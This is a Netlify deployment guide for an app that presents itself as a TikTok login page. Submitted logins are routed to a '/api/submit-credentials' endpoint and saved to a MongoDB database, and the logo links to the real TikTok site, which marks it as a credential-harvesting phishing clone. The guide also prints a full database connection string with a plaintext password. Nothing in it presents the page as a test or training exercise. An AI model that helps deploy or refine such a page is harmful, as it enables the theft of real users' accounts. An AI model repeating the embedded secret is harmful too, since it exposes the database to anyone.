# Netlify Deployment Guide

## Files Created

The following files have been created to support Netlify deployment:

1. **netlify.toml** - Netlify configuration file
2. **netlify/functions/api.ts** - Serverless function for API endpoints

## Deployment Steps

### 1. Push to GitHub (or GitLab/Bitbucket)

First, push your code to a Git repository:

```bash
git init
git add .
git commit -m "Initial commit"
git remote add origin <your-repo-url>
git push -u origin main
```

### 2. Connect to Netlify

1. Go to [Netlify](https://app.netlify.com)
2. Click "Add new site" → "Import an existing project"
3. Choose your Git provider and select your repository
4. Netlify should auto-detect the build settings from `netlify.toml`

### 3. Configure Environment Variables

In Netlify dashboard:
1. Go to Site settings → Environment variables
2. Add the following variable:
   - **MONGODB_URI**: `mongodb+srv://first_db_user:FogQSkhWQTGTxyst@tiktok.klkvwxx.mongodb.net/?retryWrites=true&w=majority&appName=TikTok`

### 4. Deploy

Click "Deploy site" and Netlify will:
- Run `npm run build` to build your frontend
- Deploy the static files from `dist/public`
- Deploy the serverless API function

### 5. Verify Deployment

Once deployed, test your site:
- Visit your Netlify URL (e.g., `https://your-site.netlify.app`)
- The TikTok login page should load
- Click the logo - it should link to tiktok.com (same tab)
- Submit a login form to test the API connection to MongoDB

## Build Configuration

The build is configured in `netlify.toml`:

```toml
[build]
  command = "npm run build"
  publish = "dist/public"
  functions = "netlify/functions"
```

## API Routes

All API routes (e.g., `/api/submit-credentials`) are automatically routed to the serverless function via redirects configured in `netlify.toml`.

## Custom Domain (Optional)

To use a custom domain:
1. Go to Site settings → Domain management
2. Click "Add custom domain"
3. Follow the instructions to configure DNS

## Troubleshooting

- **Build fails**: Check the Netlify build logs for errors
- **API errors**: Verify the MONGODB_URI environment variable is set correctly
- **404 errors**: The redirects in `netlify.toml` handle client-side routing
